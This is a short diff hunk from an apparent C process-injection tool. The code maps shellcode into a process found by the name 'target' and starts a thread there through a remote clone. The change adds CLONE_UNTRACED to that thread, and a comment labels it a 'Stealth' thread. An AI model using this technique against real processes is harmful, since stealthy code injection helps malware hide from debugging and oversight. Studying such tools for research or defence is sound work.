@@ -186,7 +186,9 @@ int main()
 
     memset(&remote_clone, 0, sizeof(communicate_remote_clone_t));
 
-    remote_clone.flags      = (CLONE_VM | CLONE_FS | CLONE_FILES);
+    // "Stealth" thread
+    remote_clone.flags      = (CLONE_VM | CLONE_FS | CLONE_FILES
+                          | CLONE_UNTRACED);
     remote_clone.stack      = remote_mmap.ret + sizeof(write_shellcode);
     remote_clone.stack_size = STACK_SIZE - sizeof(write_shellcode);
     remote_clone.pid_target = pid_name("target");
